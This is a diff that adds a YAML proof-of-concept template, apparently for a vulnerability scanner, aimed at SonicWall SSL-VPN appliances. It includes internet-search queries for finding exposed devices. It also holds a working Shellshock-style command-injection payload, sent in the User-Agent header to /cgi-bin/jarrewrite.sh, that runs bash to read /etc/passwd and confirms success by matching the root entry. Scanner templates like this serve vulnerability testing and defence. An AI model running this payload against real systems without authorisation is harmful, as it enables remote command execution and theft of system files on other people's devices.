@@ -1,0 +1,31 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: (body="login_box_sonicwall" || header="SonicWALL SSL-VPN Web Server") && body="SSL-VPN"
+    hunter-query: (web.body="login_box_sonicwall"||header="SonicWALL SSL-VPN Web Server")&&web.body="SSL-VPN"
+    quake-query: (response:"login_box_sonicwall" or headers:"SonicWALL SSL-VPN Web Server") and response:"SSL-VPN"
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    cnvd:
+
+name: poc-yaml-SonicWall-SSLVPN-UA-rce
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/jarrewrite.sh
+      follow_redirects: false
+      headers:
+        User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+      body:
+    expression: >-
+      response.status == 200 && "root:[x*]:0:0:".matches(response.body_string)
+expression: r0() 
